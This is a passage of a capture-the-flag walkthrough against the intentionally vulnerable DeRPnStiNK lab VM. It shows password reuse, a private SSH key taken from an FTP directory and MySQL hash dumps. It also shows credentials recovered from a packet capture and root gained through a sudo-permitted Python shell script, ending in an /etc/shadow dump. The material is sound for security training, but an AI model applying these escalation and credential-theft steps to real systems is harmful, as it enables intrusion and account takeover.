   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

stinky@192.168.56.83: Permission denied (publickey).
    
```

## Becoming stinky

```shell
www-data@DeRPnStiNK:/var/www/html/weblog$ su stinky
su stinky
Password: wedgie57

stinky@DeRPnStiNK:/var/www/html/weblog$ cd
cd
stinky@DeRPnStiNK:~$ pwd
pwd
/home/stinky
stinky@DeRPnStiNK:~$ whoami
whoami
stinky
stinky@DeRPnStiNK:~$ id
id
uid=1001(stinky) gid=1001(stinky) groups=1001(stinky)
stinky@DeRPnStiNK:~$ date
date
Mon Dec 27 11:09:10 EST 2021
```

### stinky home directory

```shell
stinky@DeRPnStiNK:~$ ls -lAhR
ls -lAhR
.:
total 72K
-rw-------  1 stinky stinky    19 Dec 27 11:08 .bash_history
-rwx------  1 stinky stinky   220 Nov 12  2017 .bash_logout
-rwx------  1 stinky stinky  3.6K Nov 12  2017 .bashrc
drwx------  7 stinky stinky  4.0K Nov 13  2017 .cache
drwx------  3 stinky stinky  4.0K Nov 13  2017 .compiz
drwx------ 13 stinky stinky  4.0K Nov 13  2017 .config
drwxr-xr-x  2 stinky stinky  4.0K Nov 13  2017 Desktop
-rw-r--r--  1 stinky stinky    25 Nov 13  2017 .dmrc
drwxr-xr-x  2 stinky stinky  4.0K Nov 13  2017 Documents
drwxr-xr-x  2 stinky stinky  4.0K Nov 13  2017 Downloads
drwxr-xr-x  3 nobody nogroup 4.0K Nov 12  2017 ftp
drwx------  3 stinky stinky  4.0K Nov 13  2017 .gconf
-rw-------  1 stinky stinky   334 Nov 13  2017 .ICEauthority
drwx------  3 stinky stinky  4.0K Nov 13  2017 .local
-rwx------  1 stinky stinky   675 Nov 12  2017 .profile
drwxr-xr-x  2 stinky stinky  4.0K Nov 12  2017 .ssh
-rw-------  1 stinky stinky    55 Nov 13  2017 .Xauthority
-rw-------  1 stinky stinky  1.5K Nov 13  2017 .xsession-errors

./.cache:
total 20K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 compizconfig-1
drwx------ 8 stinky stinky 4.0K Nov 13  2017 evolution
drwxrwxr-x 3 stinky stinky 4.0K Nov 13  2017 ibus
-rwx------ 1 stinky stinky    0 Nov 12  2017 motd.legal-displayed
drwx------ 2 stinky stinky 4.0K Nov 13  2017 upstart
drwx------ 2 stinky stinky 4.0K Nov 13  2017 wallpaper

./.cache/compizconfig-1:
total 112K
-rw-rw-r-- 1 stinky stinky 4.8K Nov 13  2017 animation.pb
-rw-rw-r-- 1 stinky stinky 3.6K Nov 13  2017 commands.pb
-rw-rw-r-- 1 stinky stinky   92 Nov 13  2017 compiztoolbox.pb
-rw-rw-r-- 1 stinky stinky  619 Nov 13  2017 composite.pb
-rw-rw-r-- 1 stinky stinky   63 Nov 13  2017 copytex.pb
-rw-rw-r-- 1 stinky stinky 2.4K Nov 13  2017 core.pb
-rw-rw-r-- 1 stinky stinky  982 Nov 13  2017 decor.pb
-rw-rw-r-- 1 stinky stinky 1.5K Nov 13  2017 expo.pb
-rw-rw-r-- 1 stinky stinky 2.1K Nov 13  2017 ezoom.pb
-rw-rw-r-- 1 stinky stinky  551 Nov 13  2017 fade.pb
-rw-rw-r-- 1 stinky stinky  646 Nov 13  2017 gnomecompat.pb
-rw-rw-r-- 1 stinky stinky 2.0K Nov 13  2017 grid.pb
-rw-rw-r-- 1 stinky stinky  113 Nov 13  2017 imgpng.pb
-rw-rw-r-- 1 stinky stinky  146 Nov 13  2017 mousepoll.pb
-rw-rw-r-- 1 stinky stinky  552 Nov 13  2017 move.pb
-rw-rw-r-- 1 stinky stinky  525 Nov 13  2017 opengl.pb
-rw-rw-r-- 1 stinky stinky  662 Nov 13  2017 place.pb
-rw-rw-r-- 1 stinky stinky   75 Nov 13  2017 regex.pb
-rw-rw-r-- 1 stinky stinky  854 Nov 13  2017 resize.pb
-rw-rw-r-- 1 stinky stinky 1.5K Nov 13  2017 scale.pb
-rw-rw-r-- 1 stinky stinky  160 Nov 13  2017 session.pb
-rw-rw-r-- 1 stinky stinky  335 Nov 13  2017 snap.pb
-rw-rw-r-- 1 stinky stinky  348 Nov 13  2017 unitymtgrabhandles.pb
-rw-rw-r-- 1 stinky stinky 3.6K Nov 13  2017 unityshell.pb
-rw-rw-r-- 1 stinky stinky  956 Nov 13  2017 vpswitch.pb
-rw-rw-r-- 1 stinky stinky 2.6K Nov 13  2017 wall.pb
-rw-rw-r-- 1 stinky stinky  916 Nov 13  2017 workarounds.pb

./.cache/evolution:
total 24K
drwxrwxr-x 3 stinky stinky 4.0K Nov 13  2017 addressbook
drwxrwxr-x 3 stinky stinky 4.0K Nov 13  2017 calendar
drwxrwxr-x 3 stinky stinky 4.0K Nov 13  2017 mail
drwxrwxr-x 3 stinky stinky 4.0K Nov 13  2017 memos
drwxrwxr-x 3 stinky stinky 4.0K Nov 13  2017 sources
drwxrwxr-x 3 stinky stinky 4.0K Nov 13  2017 tasks

./.cache/evolution/addressbook:
total 4.0K
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.cache/evolution/addressbook/trash:
total 0

./.cache/evolution/calendar:
total 4.0K
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.cache/evolution/calendar/trash:
total 0

./.cache/evolution/mail:
total 4.0K
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.cache/evolution/mail/trash:
total 0

./.cache/evolution/memos:
total 4.0K
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.cache/evolution/memos/trash:
total 0

./.cache/evolution/sources:
total 4.0K
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.cache/evolution/sources/trash:
total 0

./.cache/evolution/tasks:
total 4.0K
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.cache/evolution/tasks/trash:
total 0

./.cache/ibus:
total 4.0K
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 bus

./.cache/ibus/bus:
total 16K
-rw-r--r-- 1 stinky stinky 13K Nov 13  2017 registry

./.cache/upstart:
total 72K
-rw-r----- 1 stinky stinky 7.2K Nov 13  2017 dbus.log
-rw-rw-r-- 1 stinky stinky   60 Nov 13  2017 dbus-session
-rw-r----- 1 stinky stinky   91 Nov 13  2017 gnome-keyring-gpg.log
-rw-r----- 1 stinky stinky   91 Nov 13  2017 gnome-keyring-ssh.log
-rw-r----- 1 stinky stinky 9.9K Nov 13  2017 gnome-session-Unity.log
-rw-r----- 1 stinky stinky  111 Nov 13  2017 im-config.log
-rw-r----- 1 stinky stinky   80 Nov 13  2017 indicator-power.log
-rw-r----- 1 stinky stinky  474 Nov 13  2017 indicator-sound.log
-rw-r----- 1 stinky stinky   40 Nov 13  2017 ssh-agent.log
-rw-r----- 1 stinky stinky   71 Nov 13  2017 unity7.log
-rw-r----- 1 stinky stinky 1.1K Nov 13  2017 unity-panel-service.log
-rw-r----- 1 stinky stinky 1.4K Nov 13  2017 unity-settings-daemon.log
-rw-r----- 1 stinky stinky  112 Nov 13  2017 update-notifier-crash-_var_crash__usr_sbin_unity-greeter.112.crash.log
-rw-r----- 1 stinky stinky   52 Nov 13  2017 update-notifier-release.log
-rw-r----- 1 stinky stinky   84 Nov 13  2017 window-stack-bridge.log

./.cache/wallpaper:
total 1.3M
-rw-rw-r-- 1 stinky stinky 1.3M Nov 13  2017 0_5_1680_1050_792beab7550410d531e55f95b449f135

./.compiz:
total 4.0K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 session

./.compiz/session:
total 4.0K
-rw-rw-r-- 1 stinky stinky 94 Nov 13  2017 1018dc4a0a8035f952151055415761368400000066620001

./.config:
total 52K
drwx------ 3 stinky stinky 4.0K Nov 13  2017 compiz-1
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 dconf
drwx------ 3 stinky stinky 4.0K Nov 13  2017 evolution
drwxr-xr-x 3 stinky stinky 4.0K Nov 13  2017 gnome-session
drwx------ 2 stinky stinky 4.0K Nov 13  2017 gtk-3.0
drwx------ 3 stinky stinky 4.0K Nov 13  2017 ibus
drwxr-xr-x 2 stinky stinky 4.0K Nov 13  2017 libaccounts-glib
drwxr-xr-x 2 stinky stinky 4.0K Nov 13  2017 nautilus
drwx------ 2 stinky stinky 4.0K Nov 13  2017 pulse
drwx------ 2 stinky stinky 4.0K Nov 13  2017 unity
drwx------ 2 stinky stinky 4.0K Nov 13  2017 upstart
-rw------- 1 stinky stinky  632 Nov 13  2017 user-dirs.dirs
-rw-rw-r-- 1 stinky stinky    5 Nov 13  2017 user-dirs.locale

./.config/compiz-1:
total 4.0K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 compizconfig

./.config/compiz-1/compizconfig:
total 4.0K
-rw-rw-r-- 1 stinky stinky   0 Nov 13  2017 config
-rw-rw-r-- 1 stinky stinky 259 Nov 13  2017 done_upgrades

./.config/dconf:
total 8.0K
-rw-rw-r-- 1 stinky stinky 8.0K Nov 13  2017 user

./.config/evolution:
total 4.0K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 sources

./.config/evolution/sources:
total 0

./.config/gnome-session:
total 4.0K
drwxr-xr-x 2 stinky stinky 4.0K Nov 13  2017 saved-session

./.config/gnome-session/saved-session:
total 0

./.config/gtk-3.0:
total 4.0K
-rw-rw-r-- 1 stinky stinky 142 Nov 13  2017 bookmarks

./.config/ibus:
total 4.0K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 bus

./.config/ibus/bus:
total 4.0K
-rw-rw-r-- 1 stinky stinky 168 Nov 13  2017 96df3c737a962fe5d49fea495a07ac7d-unix-2

./.config/libaccounts-glib:
total 12K
-rw-r--r-- 1 stinky stinky 12K Nov 13  2017 accounts.db

./.config/nautilus:
total 16K
-rw-r--r-- 1 stinky stinky 9.3K Nov 13  2017 accels
-rw-rw-r-- 1 stinky stinky   96 Nov 13  2017 desktop-metadata

./.config/pulse:
total 28K
-rw-r--r-- 1 stinky stinky  696 Nov 13  2017 96df3c737a962fe5d49fea495a07ac7d-card-database.tdb
-rw-r--r-- 1 stinky stinky   10 Nov 13  2017 96df3c737a962fe5d49fea495a07ac7d-default-sink
-rw-r--r-- 1 stinky stinky   18 Nov 13  2017 96df3c737a962fe5d49fea495a07ac7d-default-source
-rw-r--r-- 1 stinky stinky 8.0K Nov 13  2017 96df3c737a962fe5d49fea495a07ac7d-device-volumes.tdb
-rw-r--r-- 1 stinky stinky  696 Nov 13  2017 96df3c737a962fe5d49fea495a07ac7d-stream-volumes.tdb
-rw------- 1 stinky stinky  256 Nov 13  2017 cookie

./.config/unity:
total 0
-rw-rw-r-- 1 stinky stinky 0 Nov 13  2017 first_run.stamp

./.config/upstart:
total 0

./Desktop:
total 4.0K
-rwxr-xr-x 1 stinky stinky 72 Nov 12  2017 flag.txt

./Documents:
total 4.2M
-rw-r--r-- 1 root root 4.2M Nov 13  2017 derpissues.pcap

./Downloads:
total 0

./ftp:
total 4.0K
drwxr-xr-x 5 stinky stinky 4.0K Nov 12  2017 files

./ftp/files:
total 16K
drwxr-xr-x 2 stinky stinky 4.0K Nov 12  2017 network-logs
drwxr-xr-x 3 stinky stinky 4.0K Nov 12  2017 ssh
-rwxr-xr-x 1 root   root     17 Nov 12  2017 test.txt
drwxr-xr-x 2 root   root   4.0K Nov 12  2017 tmp

./ftp/files/network-logs:
total 4.0K
-rwxr-xr-x 1 root root 719 Nov 12  2017 derpissues.txt

./ftp/files/ssh:
total 4.0K
drwxr-xr-x 3 stinky stinky 4.0K Nov 12  2017 ssh

./ftp/files/ssh/ssh:
total 4.0K
drwxr-xr-x 3 stinky stinky 4.0K Nov 12  2017 ssh

./ftp/files/ssh/ssh/ssh:
total 4.0K
drwxr-xr-x 3 stinky stinky 4.0K Nov 12  2017 ssh

./ftp/files/ssh/ssh/ssh/ssh:
total 4.0K
drwxr-xr-x 3 stinky stinky 4.0K Nov 12  2017 ssh

./ftp/files/ssh/ssh/ssh/ssh/ssh:
total 4.0K
drwxr-xr-x 3 stinky stinky 4.0K Nov 12  2017 ssh

./ftp/files/ssh/ssh/ssh/ssh/ssh/ssh:
total 4.0K
drwxr-xr-x 2 stinky stinky 4.0K Nov 13  2017 ssh

./ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh:
total 4.0K
-rwxr-xr-x 1 root root 1.7K Nov 13  2017 key.txt

./ftp/files/tmp:
total 0

./.gconf:
total 4.0K
drwx------ 4 stinky stinky 4.0K Nov 13  2017 apps

./.gconf/apps:
total 8.0K
-rw------- 1 stinky stinky    0 Nov 13  2017 %gconf.xml
drwx------ 3 stinky stinky 4.0K Nov 13  2017 gnome-terminal
drwx------ 2 stinky stinky 4.0K Nov 13  2017 nm-applet

./.gconf/apps/gnome-terminal:
total 4.0K
-rw------- 1 stinky stinky    0 Nov 13  2017 %gconf.xml
drwx------ 3 stinky stinky 4.0K Nov 13  2017 profiles

./.gconf/apps/gnome-terminal/profiles:
total 4.0K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 Default
-rw------- 1 stinky stinky    0 Nov 13  2017 %gconf.xml

./.gconf/apps/gnome-terminal/profiles/Default:
total 4.0K
-rw------- 1 stinky stinky 904 Nov 13  2017 %gconf.xml

./.gconf/apps/nm-applet:
total 4.0K
-rw------- 1 stinky stinky 102 Nov 13  2017 %gconf.xml

./.local:
total 4.0K
drwx------ 12 stinky stinky 4.0K Nov 13  2017 share

./.local/share:
total 48K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 applications
-rw-rw-r-- 1 stinky stinky    0 Nov 13  2017 .converted-launchers
drwx------ 7 stinky stinky 4.0K Nov 13  2017 evolution
-rw-rw-r-- 1 stinky stinky  956 Nov 13  2017 gsettings-data-convert
drwx------ 2 stinky stinky 4.0K Nov 13  2017 gvfs-metadata
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 icc
drwx------ 2 stinky stinky 4.0K Nov 13  2017 keyrings
drwx------ 3 stinky stinky 4.0K Nov 13  2017 nautilus
-rw-rw-r-- 1 stinky stinky  423 Nov 13  2017 session_migration-ubuntu
drwx------ 2 stinky stinky 4.0K Nov 13  2017 sounds
drwx------ 3 stinky stinky 4.0K Nov 13  2017 telepathy
drwxr-xr-x 2 stinky stinky 4.0K Nov 13  2017 unity-settings-daemon
drwx------ 3 stinky stinky 4.0K Nov 13  2017 zeitgeist

./.local/share/applications:
total 0

./.local/share/evolution:
total 20K
drwxrwxr-x 3 stinky stinky 4.0K Nov 13  2017 addressbook
drwxrwxr-x 4 stinky stinky 4.0K Nov 13  2017 calendar
drwxrwxr-x 3 stinky stinky 4.0K Nov 13  2017 mail
drwxrwxr-x 3 stinky stinky 4.0K Nov 13  2017 memos
drwxrwxr-x 4 stinky stinky 4.0K Nov 13  2017 tasks

./.local/share/evolution/addressbook:
total 4.0K
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.local/share/evolution/addressbook/trash:
total 0

./.local/share/evolution/calendar:
total 8.0K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 system
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.local/share/evolution/calendar/system:
total 4.0K
-rw-rw-r-- 1 stinky stinky 173 Nov 13  2017 calendar.ics

./.local/share/evolution/calendar/trash:
total 0

./.local/share/evolution/mail:
total 4.0K
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.local/share/evolution/mail/trash:
total 0

./.local/share/evolution/memos:
total 4.0K
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.local/share/evolution/memos/trash:
total 0

./.local/share/evolution/tasks:
total 8.0K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 system
drwxrwxr-x 2 stinky stinky 4.0K Nov 13  2017 trash

./.local/share/evolution/tasks/system:
total 4.0K
-rw-rw-r-- 1 stinky stinky 173 Nov 13  2017 tasks.ics

./.local/share/evolution/tasks/trash:
total 0

./.local/share/gvfs-metadata:
total 36K
-rw------- 1 stinky stinky  56 Nov 13  2017 home
-rw-rw-r-- 1 stinky stinky 32K Nov 13  2017 home-7cc3a224.log

./.local/share/icc:
total 0

./.local/share/keyrings:
total 8.0K
-rw------- 1 stinky stinky 105 Nov 13  2017 login.keyring
-rw------- 1 stinky stinky 207 Nov 13  2017 user.keystore

./.local/share/nautilus:
total 4.0K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 scripts

./.local/share/nautilus/scripts:
total 0

./.local/share/sounds:
total 0

./.local/share/telepathy:
total 4.0K
drwx------ 2 stinky stinky 4.0K Nov 13  2017 mission-control

./.local/share/telepathy/mission-control:
total 4.0K
-rw------- 1 stinky stinky 21 Nov 13  2017 accounts.cfg

./.local/share/unity-settings-daemon:
total 0
-rw-rw-r-- 1 stinky stinky 0 Nov 13  2017 input-sources-converted

./.local/share/zeitgeist:
total 132K
-rw------- 1 stinky stinky  49K Nov 13  2017 activity.sqlite
-rw------- 1 stinky stinky  32K Nov 13  2017 activity.sqlite-shm
-rw------- 1 stinky stinky  38K Nov 13  2017 activity.sqlite-wal
drwxr-xr-x 2 stinky stinky 4.0K Nov 13  2017 fts.index

./.local/share/zeitgeist/fts.index:
total 100K
-rw-rw-r-- 1 stinky stinky   0 Nov 13  2017 flintlock
-rw-rw-r-- 1 stinky stinky  28 Nov 13  2017 iamchert
-rw-rw-r-- 1 stinky stinky  14 Nov 13  2017 position.baseA
-rw-rw-r-- 1 stinky stinky  14 Nov 13  2017 position.baseB
-rw-rw-r-- 1 stinky stinky 16K Nov 13  2017 position.DB
-rw-rw-r-- 1 stinky stinky  14 Nov 13  2017 postlist.baseA
-rw-rw-r-- 1 stinky stinky  14 Nov 13  2017 postlist.baseB
-rw-rw-r-- 1 stinky stinky 16K Nov 13  2017 postlist.DB
-rw-rw-r-- 1 stinky stinky  14 Nov 13  2017 record.baseA
-rw-rw-r-- 1 stinky stinky  14 Nov 13  2017 record.baseB
-rw-rw-r-- 1 stinky stinky 16K Nov 13  2017 record.DB
-rw-rw-r-- 1 stinky stinky  14 Nov 13  2017 termlist.baseA
-rw-rw-r-- 1 stinky stinky  14 Nov 13  2017 termlist.baseB
-rw-rw-r-- 1 stinky stinky 16K Nov 13  2017 termlist.DB

./.ssh:
total 12K
-rwxr-xr-x 1 root   root    399 Nov 12  2017 authorized_keys
-rwxr-xr-x 1 stinky stinky 1.7K Nov 12  2017 id_rsa
-rwxr-xr-x 1 stinky stinky  399 Nov 12  2017 id_rsa.pub
```

### hidden file

```shell
stinky@DeRPnStiNK:~/ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh$ cat key.txt
cat key.txt
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
-----END RSA PRIVATE KEY-----
stinky@DeRPnStiNK:~/ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh$
```

Save it as key.txt, chmod 600 key.txt and SSH.

![11.ssh-as-stinky](11.ssh-as-stinky.png)

I cannot find anything worth while here...

## phpMyAdmin

Credentials `root:mysql`

![12.phpmyadmin](12.phpmyadmin.png)

Same thing in mysql shell:

```shell
mysql> select concat(User,':',Password) from user;
+------------------------------------------------------------+
| concat(User,':',Password)                                  |
+------------------------------------------------------------+
| root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA             |
| root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA             |
| root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA             |
| root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA             |
| debian-sys-maint:*B95758C76129F85E0D68CF79F38B66F156804E93 |
| unclestinky:*9B776AFB479B31E8047026F1185E952DD1E530CB      |
| phpmyadmin:*4ACFE3202A5FF5CF467898FC58AAB1D615029441       |
+------------------------------------------------------------+
7 rows in set (0.00 sec)
```

## Escalation

```shell
stinky@DeRPnStiNK:~$ cd ftp
stinky@DeRPnStiNK:~/ftp$ cd files
stinky@DeRPnStiNK:~/ftp/files$ ls -la
total 24
drwxr-xr-x 5 stinky stinky  4096 Nov 12  2017 .
drwxr-xr-x 3 nobody nogroup 4096 Nov 12  2017 ..
drwxr-xr-x 2 stinky stinky  4096 Nov 12  2017 network-logs
drwxr-xr-x 3 stinky stinky  4096 Nov 12  2017 ssh
-rwxr-xr-x 1 root   root      17 Nov 12  2017 test.txt
drwxr-xr-x 2 root   root    4096 Nov 12  2017 tmp
stinky@DeRPnStiNK:~/ftp/files$ cd network-logs/
stinky@DeRPnStiNK:~/ftp/files/network-logs$ ls
derpissues.txt
stinky@DeRPnStiNK:~/ftp/files/network-logs$ cat derpissues.txt 
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
stinky@DeRPnStiNK:~/ftp/files/network-logs$ find / -type f -name "*.pcap" 2>/dev/null
/home/stinky/Documents/derpissues.pcap
```

![13.export-pcap-for-analysis](13.export-pcap-for-analysis.png)

```shell
wget -q $RHOST:8080/derpissues.pcap
                                                                                                                   
```

```shell
ls -la derpissues.pcap
-rw-r--r-- 1 f0c1s f0c1s 4391468 Nov 13  2017 derpissues.pcap
                                                                                                                   
```

```shell
file derpissues.pcap
derpissues.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 65535)
    
```

![14.export](14.export.png)

![15.find-password-in-pcap-file](15.find-password-in-pcap-file.png)

![16.some-http-requests](16.some-http-requests.png)

Credentials: mrderp:derpderpderpderpderpderpderp

## Rooting

```shell
mrderp@DeRPnStiNK:~/binaries$ which python
/usr/bin/python
mrderp@DeRPnStiNK:~/binaries$ nano derpy.py 
mrderp@DeRPnStiNK:~/binaries$ chmod +x derpy.py 
mrderp@DeRPnStiNK:~/binaries$ cat derpy.py 
#!/usr/bin/env python

import os
os.system("/bin/bash")
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.py 
root@DeRPnStiNK:~/binaries# whoami
root
root@DeRPnStiNK:~/binaries# id
uid=0(root) gid=0(root) groups=0(root)
root@DeRPnStiNK:~/binaries# cd /root
root@DeRPnStiNK:/root# ls
Desktop  Documents  Downloads
root@DeRPnStiNK:/root# ls -la
total 92
drwx------ 14 root root 4096 Jan  9  2018 .
drwxr-xr-x 23 root root 4096 Nov 12  2017 ..
-rw-------  1 root root 1391 Jan  9  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------ 10 root root 4096 Nov 12  2017 .cache
drwx------  3 root root 4096 Nov 13  2017 .compiz
drwxr-xr-x 15 root root 4096 Nov 12  2017 .config
drwx------  3 root root 4096 Nov 12  2017 .dbus
drwxr-xr-x  2 root root 4096 Nov 13  2017 Desktop
-rw-r--r--  1 root root   25 Nov 12  2017 .dmrc
drwxr-xr-x  2 root root 4096 Nov 12  2017 Documents
drwxr-xr-x  2 root root 4096 Nov 12  2017 Downloads
drwx------  3 root root 4096 Jan  9  2018 .gconf
drwx------  2 root root 4096 Nov 12  2017 .gvfs
-rw-------  1 root root 2338 Jan  9  2018 .ICEauthority
drwxr-xr-x  3 root root 4096 Nov 12  2017 .local
drwx------  4 root root 4096 Nov 12  2017 .mozilla
-rw-------  1 root root  181 Nov 11  2017 .mysql_history
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
drwx------  2 root root 4096 Nov 11  2017 .ssh
-rw-------  1 root root   55 Jan  9  2018 .Xauthority
-rw-------  1 root root 1431 Jan  9  2018 .xsession-errors
-rw-------  1 root root 1431 Jan  9  2018 .xsession-errors.old
root@DeRPnStiNK:/root# cat /etc/shadow
root:$6$yPNPmfH6$F6axE51gcctbIASlvPf8XK2UXdPY2UEPuvOoz8MmKtcOLtU8i/ZEoKfFsSHwMCBWZFPB1V29ck1xPKRQP.A960:17482:0:99999:7:::
daemon:*:17016:0:99999:7:::
bin:*:17016:0:99999:7:::
sys:*:17016:0:99999:7:::
sync:*:17016:0:99999:7:::
games:*:17016:0:99999:7:::
man:*:17016:0:99999:7:::
lp:*:17016:0:99999:7:::
mail:*:17016:0:99999:7:::
news:*:17016:0:99999:7:::
uucp:*:17016:0:99999:7:::
proxy:*:17016:0:99999:7:::
www-data:*:17016:0:99999:7:::
backup:*:17016:0:99999:7:::
list:*:17016:0:99999:7:::
irc:*:17016:0:99999:7:::
gnats:*:17016:0:99999:7:::
nobody:*:17016:0:99999:7:::
libuuid:!:17016:0:99999:7:::
syslog:*:17016:0:99999:7:::
messagebus:*:17016:0:99999:7:::
usbmux:*:17016:0:99999:7:::
dnsmasq:*:17016:0:99999:7:::
avahi-autoipd:*:17016:0:99999:7:::
kernoops:*:17016:0:99999:7:::
rtkit:*:17016:0:99999:7:::
saned:*:17016:0:99999:7:::
whoopsie:*:17016:0:99999:7:::
speech-dispatcher:!:17016:0:99999:7:::
avahi:*:17016:0:99999:7:::
lightdm:*:17016:0:99999:7:::
colord:*:17016:0:99999:7:::
hplip:*:17016:0:99999:7:::
pulse:*:17016:0:99999:7:::
mysql:!:17482:0:99999:7:::
sshd:*:17482:0:99999:7:::
stinky:$6$O8GXEgz6$lNraQvWv0qSIbNjiHvU139WxDTZbVGLCNQuepIyQNfVvLep0HSuisnI7yWDA3ORdvYVU26yw3ZJRsEjga8ax5/:17482:0:99999:7:::
ftp:*:17482:0:99999:7:::
mrderp:$6$dyr91pZ0$H3orZkCLF5Scr5bSW6fdjq77eX3ilraqyZjjEVRfrmYKTx3NM7xst3h8IvZz1ltiT0Ok8SKsb69m5HqvVAyik1:17482:0:99999:7:::
```

Rooted.

![17.rooted](17.rooted.png)

</body>
</html>